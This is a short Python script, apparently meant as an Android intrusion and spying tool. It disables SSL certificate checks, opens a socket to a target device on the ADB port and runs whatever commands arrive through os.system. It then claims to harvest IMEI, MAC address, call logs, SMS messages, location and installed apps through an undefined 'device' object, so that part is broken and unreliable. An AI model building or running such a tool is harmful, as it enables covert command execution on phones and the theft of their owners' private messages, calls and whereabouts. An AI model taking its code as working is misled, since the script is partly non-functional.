import android
import time
import os
import random
import socket
import ssl

# Disable SSL verification
ssl._create_default_https_context = ssl._create_unverified_context

# Enter the device IP address
device_ip = input("Enter the device IP address: ")

# Establish a reverse shell connection to the device
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((device_ip, 5555))

# Receive the ADB shell commands from the device
while True:
    command = s.recv(1024).decode()
    if command.lower() == 'exit':
        break
    os.system(command)

# Get device information
print("Gathering device information...")
device_make = device.get_device_make()
device_model = device.get_device_model()
device_os_version = device.get_device_os_version()
device_imei = device.get_device_imei()
device_serial = device.get_device_serial()

# Get network information
print("Gathering network information...")
device_ip = device.get_device_ip()
device_mac = device.get_device_mac()
device_wifi = device.get_device_wifi()

# Get user information
print("Gathering user information...")
device_user_name = device.get_user_name()
device_user_id = device.get_user_id()

# Get app information
print("Gathering app information...")
device_apps = device.get_apps()

# Get call logs
print("Gathering call logs...")
device_call_logs = device.get_call_logs()

# Get SMS messages
print("Gathering SMS messages...")
device_sms = device.get_sms()

# Get device location
print("Gathering device location...")
device_location = device.get_device_location()

# Get battery information
print("Gathering battery information...")
device_battery = device.get_battery_info()

# Print gathered information
print("Device Information:")
print(f"Make: {device_make}")
print(f"Model: {device_model}")
print(f"OS Version: {device_os_version}")
print(f"IMEI: {device_imei}")
print(f"Serial: {device_serial}")
print(f"IP Address: {device_ip}")
print(f"MAC Address: {device_mac}")
print(f"Wi-Fi: {device_wifi}")
print(f"User Name: {device_user_name}")
print(f"User ID: {device_user_id}")
print(f"Apps: {device_apps}")
print(f"Call Logs: {device_call_logs}")
print(f"SMS: {device_sms}")
print(f"Location: {device_location}")
print(f"Battery: {device_battery}")

print("Gathering complete!")
